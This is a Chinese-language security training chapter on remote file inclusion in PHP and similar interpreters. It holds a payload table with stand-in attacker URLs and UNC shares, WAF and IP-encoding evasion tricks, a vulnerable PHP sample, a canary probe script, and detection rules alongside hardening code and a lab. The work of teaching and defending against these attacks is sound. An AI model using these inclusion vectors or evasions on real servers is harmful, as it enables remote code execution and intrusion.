# R11.4 遠端檔案包含與跨網路資源信任機制分析 (Remote File Inclusion & Cross-Network Resource Trust Analysis)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

在分散式系統、微服務架構與動態內容管理系統 (CMS) 中，伺服器端應用程式經常需要動態載入外部組件、遠端模板 (Remote Templates)、微前端片段 (Micro-Frontend Fragments) 或多語系資源包。當應用程式將客戶端可控的輸入直接作為資源定位符 (URL / URI / UNC)，且伺服器端直譯引擎或模板編譯器在未驗證資源來源、完整性與傳輸通道信任度的前提下，將該遠端資源讀入並送交直譯執行環境解析時，便會衍生**遠端檔案包含 (Remote File Inclusion, RFI)** 與**跨網路資源盲信 (Cross-Network Resource Trust Abuse)** 漏洞。

與本地檔案包含 (LFI) 侷限於受害者本機檔案系統不同，RFI 的本質在於**伺服器端跨越網路邊界主動拉取外部不可信代碼並在特權進程中具象化 (Materialization)**。這使得攻擊者無須依賴本機磁碟上的暫存檔或日誌投毒，即可直接透過外部託管伺服器向受害者直譯引擎輸送惡意指令。本手冊旨在深入剖析直譯器層級的串流解析架構 (Stream Wrappers)、Windows 平台特有的 UNC/SMB 跨網路檔案系統調用、現代架構中的動態片段渲染缺陷，並建構深度的紅藍對抗遙測特徵與縱深防禦基線。

```
[客戶端/攻擊者] ── 1. 提交外部資源定位符 (URL / UNC) ──► [目標 Web 應用程式 (動態載入邏輯)]
                                                                      │
                        ┌─────────────────────────────────────────────┴─────────────────────────────────────────────┐
                        │                                                                                           │
                        ▼ (安全防禦設計：本機靜態白名單查表)                                                          ▼ (缺陷架構：動態解析遠端協議)
            [靜態字典強制映射 (Whitelist Map)]                                                          [直譯器串流層 (Stream Wrappers / VFS)]
                        │                                                                                           │
                        ▼                                                                                           ▼
            [載入預編譯之本機安全檔案]                                                        [發起跨網路連線 (HTTP / HTTPS / SMB)]
                                                                                                                    │
                                                                                                                    ▼
                                                                                                       [拉取遠端伺服器之不可信內容]
                                                                                                                    │
                                                                                                                    ▼
                                                                                                     [直譯引擎 / 模板編譯器即時執行]
                                                                                                                    │
                                                                                                                    ▼
                                                                                                      [取得目標伺服器特權執行上下文]
```

### 作戰痛點與決策分支
- **痛點場景**：目標系統執行於動態語言環境（如 PHP、Java、Node.js 模板引擎），後端程式碼依賴 URL 參數動態載入組件，但存在防禦過濾器或副檔名拼接限制（例如硬編碼拼接 `.php` 或 `.tpl`）。
- **決策心流**：
  1. **確認直譯器遠端包含開關狀態**：
     - 檢查目標環境是否啟用遠端檔案讀取與包含能力（如 PHP 的 `allow_url_include` 與 `allow_url_fopen`）。
  2. **作業系統特有協議分流 (OS Architecture Pivot)**：
     - 若目標為 **Linux/POSIX** 且 `allow_url_include = Off`：標準 HTTP/FTP 包含會被阻斷，此時評估是否支援內聯協議（如 `data://`、`php://input`）或降級為 LFI 攻擊面。
     - 若目標為 **Windows Server** 且 `allow_url_include = Off`：評估是否能利用 **SMB/UNC 路徑 (`\\attacker-ip\share\payload.php`)**。Windows VFS 將 UNC 路徑視為本機檔案系統調用，直接繞過 URL 包含開關限制。
  3. **副檔名拼接截斷評估 (Extension Neutralization)**：
     - 若後端存在 `include($url . ".php")` 之後綴拼接，評估是否能利用 RFC 3986 規範中的查詢字串標記 (`?`) 或片段標記 (`#`) 將拼接的副檔名化為遠端 HTTP 請求的無效參數。

## 🔬 第一動：底層協定/漏洞機制全景解剖 (Mechanics & Physical Structs)

### 1. 直譯器跨網路串流解析架構 (Interpreter Remote Stream Resolution Architecture)
以 PHP Zend 引擎為例，當程式碼執行 `include($path)` 時，Zend 引擎並非直接調用 C 語言標準庫的 `fopen()`，而是透過其抽象化的 **虛擬檔案系統串流層 (PHP Streams Layer)** 進行尋址：

```
+---------------------------------------------------------------------------------------------------+
| PHP Streams 跨網路串流解析管線 (Zend Stream Resolution Pipeline)                                    |
|                                                                                                   |
| 1. 輸入參數接收：include($_GET['template']);                                                      |
|    ➔ 輸入值: "http://remote-host.internal/module.txt"                                             |
|                                                                                                   |
| 2. 協定包裝器分派 (Wrapper Dispatching - php_stream_open_wrapper_ex):                             |
|    - 檢查字串是否包含 URL Scheme (例如 "http://", "ftp://", "file://")                            |
|    - 若偵測到外部網路協議 (HTTP/HTTPS/FTP):                                                       |
|        [檢驗 allow_url_fopen] ──(若為 Off)──► [拋出 Warning: URL file-access is disabled] ➔ 終止   |
|                 │ (若為 On)                                                                       |
|                 ▼                                                                                 |
|        [檢驗 allow_url_include] ──(若為 Off)──► [拋出 URL include is disabled] ➔ 阻斷執行         |
|                 │ (若為 On)                                                                       |
|                 ▼                                                                                 |
| 3. 跨網路通訊與傳輸 (Network I/O):                                                                |
|    - 底層調用 socket() 與 connect() 向 remote-host 建立 TCP 3-Way Handshake                       |
|    - 發送 HTTP GET 請求並接收 Response Body 串流                                                 |
|                                                                                                   |
| 4. 詞法編譯與直譯執行 (Zend Compiler & Executor):                                                 |
|    - open_file_for_scanning() 將遠端傳回之二進位串流送入 Lexer 詞法分析器                        |
|    - 若偵測到 <?php 開頭標籤，編譯器將其轉換為 Opcode 虛擬機指令                                  |
|    - Zend 虛擬機直接於 Web 伺服器進程內執行該 Opcode ➔ 造成遠端代碼即時執行 (RCE)                |
+---------------------------------------------------------------------------------------------------+
```

### 2. Windows UNC 共享路徑解析與 SMB 穿透機制 (MUP & SMB Bypass)
在 Windows 作業系統上運行的 Web 伺服器（IIS、Apache on Windows、Nginx on Windows）具備獨特的檔案系統路徑解析行為：

```
+---------------------------------------------------------------------------------------------------+
| Windows 核心多提供者 UNC 解析機制 (Multiple UNC Provider - MUP Architecture)                       |
|                                                                                                   |
| 輸入路徑: include("\\\\192.168.10.5\\public\\shell.php");                                          |
|                                                                                                   |
| 1. PHP 直譯層判定:                                                                                |
|    - 字串不含 "://" 協議前綴，PHP 核心將其視為原生本地檔案路徑 (Local File Path)                |
|    - 徹底忽略 allow_url_include = Off 與 allow_url_fopen = Off 之安全限制！                       |
|                                                                                                   |
| 2. Windows 核心 I/O 轉派 (Windows Kernel NT I/O Subsystem):                                       |
|    - 調用系統 API CreateFileW(L"\\\\192.168.10.5\\public\\shell.php")                              |
|    - 核心 I/O 管理員將 UNC 路徑識別為 \\Device\\Mup (Multiple UNC Provider)                        |
|    - MUP 驅動程式透過 SMB/CIFS 重新導向器 (LanmanRedirector) 向遠端發起連線:                     |
|                                                                                                   |
|      [受害伺服器 (Web)] ────── TCP Port 445 (SMB) ──────► [攻擊者 SMB 伺服器]                     |
|                                1. SMB Negotiate Protocol                                          |
|                                2. Session Setup (匿名或 NTLMSSP 驗證)                             |
|                                3. Tree Connect to "\\192.168.10.5\public"                         |
|                                4. Create / Read Request for "shell.php"                           |
|                                                                                                   |
| 3. 代碼進入執行環境:                                                                              |
|    - SMB 重新導向器將遠端檔案內容包裝為本機檔案控制代碼 (File Handle) 回傳給 PHP                  |
|    - PHP 讀取內容並編譯為 Opcode 執行 ➔ 達成跨網路包含突破                                        |
+---------------------------------------------------------------------------------------------------+
```

### 3. 現代微服務與動態組件具象化管線 (Modern Fragment Materialization Pipeline)
在現代化微前端或伺服器端渲染 (SSR) 架構中，RFI 不僅存在於 PHP：
- **Node.js 動態模組載入**：若使用 `import(untrustedUrl)` 或動態拉取遠端 JavaScript 腳本並透過 `vm.runInContext()` 執行。
- **模板引擎遠端片段讀取 (SSI / ESI / Template Fragments)**：例如後端支援 Edge Side Includes (ESI) 或模板引擎提供動態引用功能（如 `freemarker`、`velocity` 或自訂組件解析器），伺服器端根據參數拉取遠端模板內容進行編譯與渲染，破壞了前後端信任邊界。

## ⚡ 第二動：弱點驗證與分析技術 (Vulnerability Analysis & Vectors)

### 1. 核心向量與技術變體速查表

| 機制變體 | 核心輸入範例 (Payload Construction) | 底層行為與風險分析 |
| :--- | :--- | :--- |
| **標準 HTTP/HTTPS 遠端包含** | `http://attacker-controlled.site/code.txt` | 目標環境需開啟 `allow_url_include = On`。伺服器發起 HTTP GET 請求拉取遠端文字檔並送入直譯器執行。 |
| **URL 查詢參數副檔名截斷** | `http://attacker.site/code.txt?`<br>`http://attacker.site/code.txt%23` | 當後端程式碼強制拼接後綴（如 `include($url . ".php")`）時，利用問號 `?` 將後續拼接內容化為遠端 HTTP 請求的 GET 參數，使遠端伺服器依然精確回傳 `code.txt`。 |
| **Windows SMB/UNC 跨網段包含** | `\\192.168.1.100\share\payload.php`<br>`//192.168.1.100/share/payload.php` | 專門針對 Windows 伺服器。即使 `allow_url_include = Off`，Windows MUP 仍會透過 SMB (Port 445) 讀取遠端共享檔案，並由本地檔案 API 交付直譯器執行。 |
| **內聯資料協議偽遠端包含** | `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+` | 當 `allow_url_include = On` 且伺服器被防火牆阻斷出站連線時，直接將包含惡意代碼的 Base64 字串透過 `data://` 協議作為串流讀入，無須發起外部網路請求。 |
| **HTTP POST 串流載入 (`php://input`)** | URL: `http://target/index.php?page=php://input`<br>Body: `<?php phpinfo(); ?>` | 將 HTTP POST 請求主體視為輸入串流交給直譯器執行。同樣需要 `allow_url_include = On`。 |
| **FTP 協定跨網路包含** | `ftp://attacker.site/pub/shell.txt` | 透過 FTP 協定拉取檔案。可用於繞過部分僅比對 HTTP/HTTPS 關鍵字的正則過濾器。 |

### 2. 診斷與安全分析腳本 (安全審計用途)

以下腳本為安全審計與架構檢測工具，採用無害化標記 (Canary Token) 檢驗目標系統是否存在遠端資源拉取與具象化漏洞，絕不夾帶惡意載荷：

```python
#!/usr/bin/env python3
"""
R11.4 遠端檔案包含與跨網路信任機制安全診斷腳本 (RFI Safe Diagnostic Probe)
用途：安全審計專用，透過驗證伺服器出站連線與內容具象化行為，評估遠端包含風險。
"""

import requests
import hashlib
import uuid
import sys
from urllib.parse import quote

# 檢測配置
TARGET_ENDPOINT = "http://target.internal/load_template.php"
TARGET_PARAM = "module"
# 模擬之受控審計回連伺服器 (Audit Callback Listener)
AUDIT_LISTENER_HOST = "audit-verifier.internal"
AUDIT_LISTENER_PORT = 8080

def generate_canary():
    """產生唯一隨機審計標記"""
    nonce = uuid.uuid4().hex[:12]
    expected_hash = hashlib.sha256(nonce.encode()).hexdigest()[:16]
    return nonce, expected_hash

def probe_http_rfi_vulnerability():
    nonce, expected_marker = generate_canary()
    
    # 構造無害診斷資源 URL (遠端伺服器預期回傳包含安全標記的文本)
    probe_url = f"http://{AUDIT_LISTENER_HOST}:{AUDIT_LISTENER_PORT}/canary.txt?nonce={nonce}"
    
    # 測試向量 1: 標準包含
    # 測試向量 2: 帶有問號截斷 (應對後綴拼接)
    vectors = [
        ("標準 URL 包含", probe_url),
        ("查詢字串截斷包含", f"{probe_url}&ext=")
    ]
    
    print(f"[*] 開始對目標端點發起 RFI 安全架構檢驗: {TARGET_ENDPOINT}")
    
    for vector_name, payload in vectors:
        params = {TARGET_PARAM: payload}
        headers = {"User-Agent": "Security-Audit-Probe/1.0 (Resource-Trust-Check)"}
        
        try:
            print(f"[*] 測試向量: {vector_name} -> 傳入參數: {payload}")
            resp = requests.get(TARGET_ENDPOINT, params=params, headers=headers, timeout=6)
            
            # 分析回顯內容是否包含遠端資源具象化後的結果
            if nonce in resp.text or expected_marker in resp.text:
                print(f"[!] 警告：偵測到目標系統存在遠端檔案包含 (RFI) 脆弱性！")
                print(f"    觸發向量: {vector_name}")
                print(f"    特徵比對: 成功識別遠端標記值 [{nonce}]")
                return True
            else:
                print(f"[-] 向量 [{vector_name}] 未產生內容具象化特徵 (狀態碼: {resp.status_code})")
                
        except requests.exceptions.Timeout:
            print(f"[?] 連線超時：目標可能正嘗試發起出站連線，或出站網路被防火牆阻斷 (Drop)。")
        except requests.exceptions.RequestException as e:
            print(f"[-] 連線發生錯誤: {e}")
            
    return False

if __name__ == "__main__":
    is_vulnerable = probe_http_rfi_vulnerability()
    if is_vulnerable:
        sys.exit(1)
    else:
        print("[+] 檢測完成：未發現明顯的直接遠端檔案包含特徵。")
        sys.exit(0)
```

## 🥷 第三動：防禦規避與反鑑識分析 (Evasion & Anti-Forensics Analysis)

### 1. 規避 WAF 與協定過濾之特徵分析
- **協定 Scheme 大小寫與混淆**：
  若 WAF 僅依賴區分大小寫的正則表達式檢驗 `http://`，攻擊者常利用直譯器對協議大小寫不敏感的特性，構造 `hTtP://`、`HtTpS://` 或利用 URL 編碼 `http%3a%2f%2f` 進行走私。
- **IP 位址異構表示法**：
  為規避基於 IP 黑名單或域名關鍵字的過濾規則，遠端資源的主機位址可被轉換為多種等價形態：
  - 十進位整數 IP：`http://2130706433/` 等同於 `http://127.0.0.1/`
  - 八進位 IP：`http://0177.0.0.1/`
  - 十六進位 IP：`http://0x7f000001/`
  - 雙重編碼與 IPv6 映射：`http://[::ffff:127.0.0.1]/`
- **Windows UNC 路徑正規化差異**：
  Windows 系統底層同時相容正反斜線，例如 `\\192.168.1.1\share` 與 `//192.168.1.1/share` 在核心 MUP 中均能正確解析。若防禦過濾器僅比對 `\\`，使用反斜線與正斜線混合的路徑即可達成規避。
- **無網路外連之偽遠端協議 (`data://`)**：
  當目標主機處於嚴密的出站隔離網路（無法發起外網 TCP 連線）時，攻擊者轉向使用 `data://` 協議，將完整的代碼直接寫在 URL 中，利用伺服器內部的串流解析引擎完成載入，完全不產生任何外部網路連線足跡。

### 2. 鑑識視角下的日誌殘留與遙測特徵
當 RFI 發生時，受害系統會在多個防禦層級留下清晰的遙測痕跡：

1. **Web Access Log (應用層存取日誌)**：
   - 請求 URI 參數中出現未預期的 URL 協議特徵（`http://`、`https://`、`ftp://`）或 UNC 路徑標記（`\\`、`//`）。
   - 出現非預期的截斷字元編碼，例如 `%3f` (`?`) 或 `%23` (`#`)。
2. **DNS 查詢日誌 (DNS Telemetry)**：
   - 受害伺服器向內部或外部 DNS 伺服器發起非業務常態的外部網域名稱解析請求（A/AAAA 記錄），且查詢發起進程為 Web 伺服器守護進程（如 `httpd`、`php-fpm`、`w3wp.exe`）。
3. **主機網路出站連線 (Network Egress Telemetry - Sysmon Event ID 3)**：
   - Web 服務進程主動向非預期的外部 IP 位址建立 TCP 80、443、8080 或 445 連線。
   - 典型異常特徵：Linux 環境下 `php-fpm` 或 `www-data` 用戶進程出現 `SYN_SENT` / `ESTABLISHED` 狀態之外部連線。
4. **Windows SMB 用戶端連線事件**：
   - 在 Windows 事件檢視器 `Applications and Services Logs/Microsoft/Windows/SMBClient/Operational` 中，會記錄事件識別碼 **30803**（嘗試連線到 SMB 伺服器失敗）或 **30804**（連線建立成功），記錄中包含遠端伺服器 IP 與請求的共享路徑。

| 攻擊與測試向量 (Vector) | 系統遙測指標 (Telemetry & Artifacts) | 防禦檢測規則 (Detection Signature) | 安全架構加固措施 (Remediation Architecture) |
| :--- | :--- | :--- | :--- |
| **HTTP/HTTPS 外部 URL 包含** | • Web Access Log 記錄 URL 出現 `http://` 或 `https://`。<br>• Sysmon Event ID 3 記錄 Web 進程發起出站 TCP 連線。<br>• DNS 伺服器出現外部陌生網域解析。 | **Sigma 規則**：監控 `Image` 為 `php-fpm`、`w3wp.exe` 或 `httpd` 發起之非預付出站網路連線。<br>**WAF (OWASP CRS 931100)**：偵測參數中包含遠端 URI 協議前綴。 | • 在 `php.ini` 強制配置 `allow_url_include = Off` 及 `allow_url_fopen = Off`。<br>• 部署網路邊界出站防火牆，預設封鎖 Web 伺服器對外主動發起 TCP 連線。 |
| **Windows SMB/UNC 跨網段包含** | • SMBClient Operational Event ID 30804。<br>• 防火牆日誌捕捉到 Web 伺服器對外發起 TCP 445 (SMB) 出站連線。<br>• 伺服器端產生對 `\\IP\share` 的檔案控制代碼操作。 | **Suricata 規則**：<br>`alert tcp $DMZ_SERVERS any -> $EXTERNAL_NET 445 (msg:"Web Server Outbound SMB Connection"; sid:2000001; rev:1;)` | • 邊界路由器與防火牆徹底阻斷 DMZ 伺服器出站之 TCP 445 與 UDP 137-139 封包。<br>• Windows 端停用 Web 帳戶存取網路共享之權限。 |
| **內聯協議偽包含 (`data://`)** | • Web 請求中包含 `data:text/plain` 或 Base64 標記。<br>• 伺服器記憶體中編譯無本機檔案對應之代碼區塊。 | **WAF 規則 (CRS 931110)**：<br>`REQUEST_URI|REQUEST_BODY` 匹配 `data:(?:text|application)\/` 或 `base64,` 特徵。 | • 停用 `allow_url_include`。<br>• 在原始碼中使用嚴格的正則驗證或字串格式校驗，阻斷協議頭。 |
| **URL 參數截斷繞過 (`?` / `#`)** | • Web 日誌中參數末端出現 `%3f`、`?`、`%23` 或 `#`。<br>• 外部審計日誌顯示遠端伺服器接收到額外帶有 `.php` 參數的請求。 | **SIEM 關聯分析**：<br>單一 URI 參數內同時包含 URL Scheme (`http://`) 且結尾帶有截斷字元 (`?` 或 `%3f`)。 | • 程式碼層級全面移除動態包含邏輯，採用靜態白名單查表法 (Whitelist Hash Map)。 |

## 🛡️ 第五動：安全加固與程式碼重構 (Hardening & Remediation Baseline)

### 1. 脆弱程式碼 vs. 工業級安全防護重構

#### ❌ 脆弱的實現方式 (動態盲信遠端輸入)
```php
<?php
// 嚴重安全瑕疵：完全信任使用者傳入之路徑/URL
$component = $_GET['component'];

// 若 allow_url_include = On，攻擊者傳入 "http://evil.com/shell.txt?" 即可直接取得 RCE
// 若為 Windows 伺服器，傳入 "\\attacker-ip\share\shell.php" 可繞過所有 URL 配置取得 RCE
include($component . ".php");
?>
```

#### ✅ 工業級安全防護實現 (嚴格白名單映射與零信任架構)
```php
<?php
/**
 * 工業級安全重構範例：嚴格白名單查表法 (Strict Whitelist Mapping)
 * 原則：完全禁止使用動態輸入拼接路徑或遠端定位符
 */

declare(strict_types=1);

// 1. 定義允許載入之合法組件白名單映射表 (儲存為本機絕對路徑)
$ALLOWED_COMPONENTS = [
    'header'      => __DIR__ . '/components/header.php',
    'footer'      => __DIR__ . '/components/footer.php',
    'navigation'  => __DIR__ . '/components/navigation.php',
    'dashboard'   => __DIR__ . '/components/dashboard.php',
];

// 2. 獲取使用者請求參數，設定安全預設值
$requested_key = $_GET['component'] ?? 'dashboard';

// 3. 嚴格比對白名單鍵值 (Key Matching)
if (!is_string($requested_key) || !array_key_exists($requested_key, $ALLOWED_COMPONENTS)) {
    // 記錄安全日誌並回傳 404
    error_log(sprintf("[SECURITY] 未經授權的組件載入嘗試: IP=%s, Input=%s", 
        $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN', 
        substr((string)$requested_key, 0, 100)
    ));
    http_response_code(404);
    include(__DIR__ . '/components/404.php');
    exit;
}

// 4. 僅載入白名單所指向之安全本機檔案
$target_file = $ALLOWED_COMPONENTS[$requested_key];

if (file_exists($target_file) && is_readable($target_file)) {
    include($target_file);
} else {
    http_response_code(500);
    echo "系統內部錯誤：組件不可用。";
}
?>
```

#### ✅ 若業務必須拉取遠端資源：雙向驗證與隔離沙盒架構
若業務情境（如微前端、第三方外掛）必須從遠端服務動態獲取內容，**絕對不可使用 `include` 或 `eval` 直接執行**，必須遵守以下安全控制規範：
1. **傳輸通道驗證**：僅允許向預先在伺服器端設定檔中固化之信任網域 (Trusted Domain Whitelist) 發起 HTTPS 請求，並啟用雙向 mTLS 與嚴格的 TLS 憑證校驗。
2. **完整性與簽章校驗 (Cryptographic Attestation)**：遠端資源必須附帶數位簽章（如 Ed25519 或 HMAC-SHA256）。受害伺服器在記憶體中驗證簽章無誤後，方可處理其內容。
3. **內容資料化而非代碼化**：將遠端資源視為純資料（如 JSON 或靜態 HTML），透過無邏輯模板引擎渲染，嚴禁使用直譯器執行該內容。

### 2. 直譯環境與作業系統加固基線

#### (1) `php.ini` 核心安全參數配置
```ini
; 1. 徹底關閉遠端檔案包含能力 (預設為 Off，嚴禁開啟)
allow_url_include = Off

; 2. 關閉 URL 檔案讀取 (若無業務需求，強烈建議關閉)
allow_url_fopen = Off

; 3. 限制檔案系統存取邊界 (即使遭遇本機路徑跳躍亦無法越界)
open_basedir = "/var/www/html/:/tmp/"

; 4. 關閉錯誤細節暴露與 PHP 版本洩漏
display_errors = Off
log_errors = On
expose_php = Off
```

#### (2) 網路出口邊界防火牆策略 (Egress Network Control)
RFI 的關鍵特徵在於**伺服器主動發起出站連線**。實施嚴格的出口防火牆原則可徹底瓦解該攻擊面：
```bash
# Linux iptables 範例：預設阻斷 Web 伺服器對外主動連線 (Default Deny Egress)
iptables -P OUTPUT DROP

# 允許本機回環介面
iptables -A OUTPUT -o lo -j ACCEPT

# 允許已建立連線的回應封包 (ESTABLISHED, RELATED)
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# 僅允許必要的內部 DNS 解析 (UDP 53)
iptables -A OUTPUT -p udp --dport 53 -d 10.0.0.2 -j ACCEPT

# 嚴格禁止對外發起 TCP 80, 443, 445 連線 (有效阻斷 RFI 回連)
```

#### (3) Windows 平台特有之 SMB 邊界防禦
- **邊界防火牆阻斷**：在企業出口防火牆與主機防火牆 (Windows Defender Firewall) 上，全面禁止 Web 伺服器對外部公網 IP 發起 TCP 445 (SMB) 連線。
- **限制服務帳戶之網路存取**：確保 IIS 應用程式集區 (Application Pool Identity) 或執行 Web 服務的使用者未具備存取遠端未受信任共享目錄之權限。

## 🧪 實戰演練環境導引 (Hands-on Range Lab Walkthrough)

本實驗提供一個受控的沙盒環境，用於驗證遠端包含機制、出站連線阻斷效果與安全白名單修復。

### 1. 受控沙盒伺服器搭建 (`vulnerable_app.php`)
```php
<?php
// 安全演練沙盒環境：vulnerable_app.php
header("Content-Type: text/plain; charset=UTF-8");

echo "=== R11.4 資源動態載入驗證沙盒 ===\n";

$resource = $_GET['resource'] ?? 'local_default';

if ($resource === 'local_default') {
    echo "[INFO] 載入預設本機模組。\n";
} else {
    // 脆弱點：直接嘗試載入外部輸入
    // 注意：若環境配置 allow_url_include = Off，此處會拋出 Warning 並終止
    echo "[DEBUG] 嘗試處理資源指標: " . htmlspecialchars($resource, ENT_QUOTES) . "\n";
    @include($resource);
}
?>
```

### 2. 演練與驗證步驟

#### 步驟 1：驗證標準環境配置之防禦效果
在標準配置（`allow_url_include = Off`）的環境中，使用 `curl` 嘗試載入外部 HTTP 資源：
```bash
curl -i "http://127.0.0.1:8080/vulnerable_app.php?resource=http://audit-server.internal/test.txt"
```
**預期回顯**：
- HTTP 200 回應，但頁面輸出 `[DEBUG] 嘗試處理資源指標...`，且直譯器阻斷載入，不產生任何遠端執行行為。

#### 步驟 2：驗證資料協議之阻斷效果
```bash
curl -i "http://127.0.0.1:8080/vulnerable_app.php?resource=data://text/plain;base64,UEhQIFRFU1QgTUFSS0VSCg=="
```
**預期回顯**：
- 直譯器因未開啟 `allow_url_include`，直接拒絕將 `data://` 協議作為合法包含源。

#### 步驟 3：驗證白名單防禦架構之健壯性
將程式碼切換為第五動之**工業級安全白名單架構**後，重複執行上述所有包含測試：
```bash
curl -i "http://127.0.0.1:8080/vulnerable_app.php?resource=http://audit-server.internal/test.txt"
```
**預期回顯**：
- 系統直接回傳 `HTTP/1.1 404 Not Found`，所有非白名單內的字串均被第一時間拒絕，徹底終結任何跨網路資源信任風險。

## 🎯 作戰驗收檢查點 (Mastery Checklist)

- [ ] **Q1. 遠端檔案包含 (RFI)、本地檔案包含 (LFI) 與伺服器端請求偽造 (SSRF) 在威脅本質與執行上下文上有何根本差異？**  
  *分析思路*：
  1. **SSRF** 的本質在於伺服器發起網路請求拉取資源，但伺服器通常僅轉發、儲存或解析該回應內容（如解析 JSON 或圖片），**不將其送入直譯引擎執行**。
  2. **LFI** 是將**本機檔案系統**中既有的檔案交付給直譯引擎解析，受限於本機磁碟上可存取的檔案內容。
  3. **RFI** 則是**兩者的危險結合**：伺服器跨越網路邊界拉取外部遠端資源，並**立即將其送入直譯引擎/編譯器中以伺服器特權執行**，直接導致遠端代碼執行 (RCE)。

- [ ] **Q2. 為什麼在 Windows 作業系統架構下，即使管理員在 `php.ini` 中嚴格設定了 `allow_url_include = Off`，系統依然可能面臨跨網路包含的威脅？底層原因是什麼？**  
  *分析思路*：
  1. `allow_url_include` 與 `allow_url_fopen` 是 PHP 串流層 (Streams) 用於管制帶有 `://` 協定標誌（Scheme）之虛擬包裝器的開關。
  2. 在 Windows 上，UNC 路徑格式（如 `\\192.168.1.10\share\test.php`）不包含 URL Scheme 前綴，PHP 直譯器在進行詞法解析時將其判定為「標準本機作業系統路徑」。
  3. Windows 核心的 MUP (Multiple UNC Provider) 會在底層自動透過 SMB 協定 (TCP Port 445) 與遠端伺服器建立共享連線並透明讀取檔案，因此徹底繞過了直譯器的 URL 包含安全限制。

- [ ] **Q3. 當後端程式碼存在副檔名硬編碼拼接（例如 `include($_GET['page'] . ".php");`）時，攻擊者構造 `http://attacker.com/code.txt?` 進行截斷的底層通訊原理為何？**  
  *分析思路*：
  1. 當拼接發生後，直譯器接收到的目標 URL 為 `http://attacker.com/code.txt?.php`。
  2. 直譯器的 HTTP 串流包裝器依照 RFC 3986 規範解析該 URL，將問號 `?` 視為查詢字串 (Query String) 的起始標記，將後續拼接的 `.php` 視為 GET 參數名稱。
  3. 伺服器向攻擊者託管伺服器發送的 HTTP 請求實質為 `GET /code.txt?.php HTTP/1.0`。
  4. 攻擊者的 Web 伺服器會忽略該查詢字串，精確回傳 `code.txt` 的本體內容，成功達成副檔名中和與代碼注入。

- [ ] **Q4. 從深層防禦 (Defense-in-Depth) 的角度出發，為什麼「嚴格限制伺服器出站網路流量 (Egress Filtering)」被視為防禦 RFI 危害的最強硬手段？**  
  *分析思路*：
  1. RFI 的成功關鍵在於伺服器能夠跨越網路邊界連線至外部受控節點拉取載荷（不論透過 HTTP/HTTPS 亦或 SMB 445）。
  2. 若在主機與網路邊界部署「預設拒絕出站 (Default-Deny Egress)」策略，嚴格阻斷 Web 伺服器對外主動發起 TCP 連線，即使應用程式原始碼存在未修補的動態包含漏洞，伺服器在執行時亦因無法建立出站 Socket 連線而發生 Timeout 或連線失敗，從網路層直接瓦解攻擊鏈。

- [ ] **Q5. 在現代化微服務與分散式架構中，若業務系統確有動態載入微前端片段或遠端組件之架構需求，應如何建立符合零信任 (Zero Trust) 原則的安全機制？**  
  *分析思路*：
  1. **拒絕直譯執行**：絕對不使用 `eval()`、動態 `import()` 或直譯器 `include` 直接執行遠端未編譯之原始碼。
  2. **靜態註冊與雜湊鎖定 (Subresource Integrity / Hash Pinning)**：遠端組件在發布時必須於主控端預先註冊對應的 SHA-256/SHA-512 雜湊值，載入時強制比對雜湊，防止傳輸過程篡改。
  3. **數位簽章驗證 (Cryptographic Signing)**：所有遠端片段發布必須具備發布者私鑰簽章，主應用程式使用預置公鑰驗證簽章無誤後方可解析。
  4. **沙盒化渲染 (Sandboxed Isolation)**：將動態內容置於權限受限的無特權沙盒（如 iframe sandbox、Worker 或 WebAssembly 隔離環境）中渲染，剝奪其存取主系統機密環境變數、DOM 或特權 API 之能力。
